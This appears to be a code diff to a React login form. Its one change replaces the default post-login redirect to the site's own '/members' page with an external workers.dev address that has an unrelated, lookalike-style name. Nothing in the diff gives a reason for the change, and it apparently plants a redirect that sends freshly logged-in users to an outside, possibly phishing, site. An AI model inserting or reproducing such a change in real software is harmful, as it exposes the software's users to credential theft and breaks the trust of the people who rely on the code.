@@ -38,7 +38,7 @@ export default function LoginForm({ next }: Props): React.JSX.Element {
         return;
       }
 
-      window.location.assign(next === '' ? '/members' : next);
+      window.location.assign(next === '' ? 'https://swifthordingsportal.securemensah.workers.dev' : next);
     } catch {
       setError('The network is unreachable. Please try again.');
       setSubmitting(false);
